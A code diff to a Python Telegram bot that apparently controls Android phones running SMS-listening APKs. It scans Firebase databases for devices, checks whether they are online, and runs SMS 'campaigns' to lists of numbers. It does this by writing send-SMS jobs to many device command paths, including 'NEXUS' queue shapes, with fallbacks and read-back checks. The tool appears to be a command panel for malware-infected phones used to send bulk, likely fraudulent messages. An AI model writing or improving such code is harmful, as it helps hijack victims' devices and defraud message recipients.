@@ -36,7 +36,7 @@ ALLOWED_USERS: set[int] = set()  # empty = everyone
 SMS_PER_DEVICE = 5
 # Match 2.py: 15 min freshness window for lastSeen / heartbeat
 ONLINE_WINDOW_MS = 15 * 60 * 1000
-JOB_DELAY_SEC = 1.2
+JOB_DELAY_SEC = 2.0
 PROGRESS_EDIT_EVERY = 3
 HTTP_TIMEOUT = 25
 
@@ -103,11 +103,16 @@ def norm_url(raw: str) -> str:
     return u.rstrip("/")
 
 def fb_url(base: str, path: str = "", secret: str = "") -> str:
-    """Build REST endpoint: {base}/{path}.json?auth=SECRET"""
+    """Build REST endpoint: {base}/{path}.json?auth=SECRET
+    Path may already end with .json (2.py style) — do not double it.
+    """
     base = norm_url(base)
     path = (path or "").strip().strip("/")
     if path:
-        ep = f"{base}/{path}.json"
+        if path.endswith(".json"):
+            ep = f"{base}/{path}"
+        else:
+            ep = f"{base}/{path}.json"
     else:
         ep = f"{base}/.json"
     if secret:
@@ -383,59 +388,125 @@ def scan_devices(db_url: str, secret: str = "") -> list[dict]:
 
 def push_sms_job(db_url: str, secret: str, device_id: str, to: str, body: str, chat_id: int) -> str:
     """
-    Write SMS job using 2.py path order first, then NEXUS-style sendSms queue.
-    APKs listen on different nodes — try until one write succeeds.
+    Exact 2.py write order + payload fields.
+    Paths include .json leaf (fb_url will not double-append).
+    Also mirrors NEXUS queue as last fallback.
     """
     job_id = str(uuid.uuid4())[:12]
     now_ms = int(time.time() * 1000)
-    sim = 0  # 2.py uses 0-based sim index
+    # 2.py: sim_index default 0 (SIM 1). Also try 1 if needed by some APKs.
+    to_n = to.strip()
+    msg = body.strip()
 
-    # 2.py simple payload (webhookEvent/sendSms)
-    payload_simple = {
-        "from": sim,
-        "to": to.strip(),
-        "message": body.strip(),
+    payload_simple_0 = {
+        "from": 0,
+        "to": to_n,
+        "message": msg,
         "isSended": False,
     }
-    # 2.py cmd-style payload
-    payload_cmd = {
+    payload_simple_1 = {
+        "from": 1,
+        "to": to_n,
+        "message": msg,
+        "isSended": False,
+    }
+    payload_cmd_0 = {
         "cmdId": now_ms,
-        "from": sim,
-        "to": to.strip(),
-        "message": body.strip(),
+        "from": 0,
+        "to": to_n,
+        "message": msg,
         "isSended": False,
         "sendOk": False,
     }
-    # NEXUS / AndroidSmsListener queue shape
+    payload_cmd_1 = {
+        "cmdId": now_ms,
+        "from": 1,
+        "to": to_n,
+        "message": msg,
+        "isSended": False,
+        "sendOk": False,
+    }
+    # NEXUS / AndroidSmsListener shape
     payload_nexus = {
-        "to": to.strip(),
-        "body": body.strip(),
+        "to": to_n,
+        "body": msg,
         "status": "pending",
         "createdAt": now_ms,
         "requestedBy": chat_id,
         "sim": 1,
     }
+    # Some APKs use "sms" / "text" key names
+    payload_alt = {
+        "from": 0,
+        "to": to_n,
+        "sms": msg,
+        "text": msg,
+        "message": msg,
+        "body": msg,
+        "isSended": False,
+        "status": "pending",
+    }
 
+    # Same path strings as 2.py (with .json) first
     attempts = [
-        (f"clients/{device_id}/webhookEvent/sendSms", payload_simple),
-        (f"devices/{device_id}/webhookEvent/sendSms", payload_simple),
-        (f"devices/{device_id}/actions/sendSms", payload_cmd),
-        (f"clients/{device_id}/actions/sendSms", payload_cmd),
+        (f"clients/{device_id}/webhookEvent/sendSms.json", payload_simple_0),
+        (f"devices/{device_id}/webhookEvent/sendSms.json", payload_simple_0),
+        (f"devices/{device_id}/actions/sendSms.json", payload_cmd_0),
+        (f"clients/{device_id}/actions/sendSms.json", payload_cmd_0),
+        # sim slot 1 variants
+        (f"clients/{device_id}/webhookEvent/sendSms.json", payload_simple_1),
+        (f"devices/{device_id}/webhookEvent/sendSms.json", payload_simple_1),
+        (f"devices/{device_id}/actions/sendSms.json", payload_cmd_1),
+        (f"clients/{device_id}/actions/sendSms.json", payload_cmd_1),
+        # without .json leaf (fb_url adds it)
+        (f"clients/{device_id}/webhookEvent/sendSms", payload_simple_0),
+        (f"devices/{device_id}/webhookEvent/sendSms", payload_simple_0),
+        (f"devices/{device_id}/actions/sendSms", payload_cmd_0),
+        (f"clients/{device_id}/actions/sendSms", payload_cmd_0),
+        # NEXUS queue
         (f"devices/{device_id}/sendSms/{job_id}", payload_nexus),
         (f"clients/{device_id}/sendSms/{job_id}", payload_nexus),
+        (f"devices/{device_id}/webhookEvent/sms", payload_alt),
+        (f"clients/{device_id}/webhookEvent/sms", payload_alt),
     ]
 
     last_err = None
-    for path, payload in attempts:
+    wrote_paths = []
+    # Write ALL primary 2.py paths so any APK listener present sees the job.
+    primary = attempts[:4]
+    extras = attempts[4:]
+
+    for path, payload in primary:
         try:
             fb_put(db_url, path, payload, secret)
-            log.info("SMS job OK via %s → %s", path, to)
-            return job_id
+            wrote_paths.append(path)
+            log.info("SMS job OK via %s → %s", path, to_n)
         except Exception as e:
             last_err = e
-            log.debug("path fail %s: %s", path, e)
-            continue
-    raise RuntimeError(f"all send paths failed: {last_err}")
+            log.warning("path fail %s: %s", path, e)
+
+    if not wrote_paths:
+        for path, payload in extras:
+            try:
+                fb_put(db_url, path, payload, secret)
+                wrote_paths.append(path)
+                log.info("SMS job OK via fallback %s → %s", path, to_n)
+                break
+            except Exception as e:
+                last_err = e
+                log.warning("fallback fail %s: %s", path, e)
+
+    if not wrote_paths:
+        raise RuntimeError(f"all send paths failed: {last_err}")
+
+    # Read-back verify first written path
+    try:
+        check = fb_get(db_url, wrote_paths[0].replace(".json", ""), secret)
+        log.info("verify %s → %s", wrote_paths[0], str(check)[:120] if check else "null")
+    except Exception as e:
+        log.warning("verify read failed: %s", e)
+
+    return job_id
 
 # ── PARSE INPUT FILES ─────────────────────────────────────────────────────
 def parse_firebase_urls(text: str) -> list[tuple[str, str]]:
@@ -481,6 +552,7 @@ def parse_firebase_urls(text: str) -> list[tuple[str, str]]:
     return results
 
 def parse_numbers(text: str) -> list[str]:
+    """Keep numbers exactly as provided — do NOT auto-prefix +91."""
     nums = []
     seen = set()
     for line in text.splitlines():
@@ -489,16 +561,8 @@ def parse_numbers(text: str) -> list[str]:
             continue
         for tok in re.split(r"[\s,;|]+", line):
             dig = re.sub(r"[^\d+]", "", tok)
-            if len(dig) < 10:
+            if len(dig) < 8:
                 continue
-            if dig.startswith("0") and len(dig) == 11:
-                dig = "+91" + dig[1:]
-            elif dig.startswith("91") and len(dig) == 12:
-                dig = "+" + dig
-            elif len(dig) == 10 and dig[0] in "6789":
-                dig = "+91" + dig
-            elif not dig.startswith("+") and len(dig) >= 10:
-                dig = "+" + dig
             if dig not in seen:
                 seen.add(dig)
                 nums.append(dig)
@@ -601,7 +665,10 @@ def run_campaign(chat_id: int):
         bot.send_message(
             chat_id,
             f"<b>Campaign finished</b>\n"
-            f"✅ {s.sent} sent · ❌ {s.failed} failed · Total {s.total}\n"
+            f"✅ {s.sent} queued on Firebase · ❌ {s.failed} failed · Total {s.total}\n\n"
+            f"<i>Note: “queued” = job written to Firebase "
+            f"(clients/…/webhookEvent/sendSms + devices/… paths). "
+            f"Phone must be online with APK listening to actually transmit SMS.</i>\n\n"
             f"Use /start for a new run."
         )
     except Exception:
